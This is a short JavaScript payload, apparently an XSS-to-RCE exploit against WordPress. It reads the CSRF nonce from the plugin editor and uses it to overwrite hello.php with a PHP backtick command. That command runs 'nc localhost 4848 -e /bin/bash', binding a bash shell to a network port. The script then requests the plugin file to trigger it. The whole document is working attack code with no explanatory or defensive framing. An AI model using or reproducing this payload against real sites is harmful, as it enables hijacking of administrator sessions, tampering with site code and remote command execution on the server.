p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`nc localhost 4848 -e /bin/bash`;';

a = new XMLHttpRequest();
a.open('GET', p+q, 0);
a.send();

$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&' + q;

b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);

b.onreadystatechange = function(){
   if (this.readyState == 4) {
      fetch('/wordpress/wp-content/plugins/hello.php');
   }
}
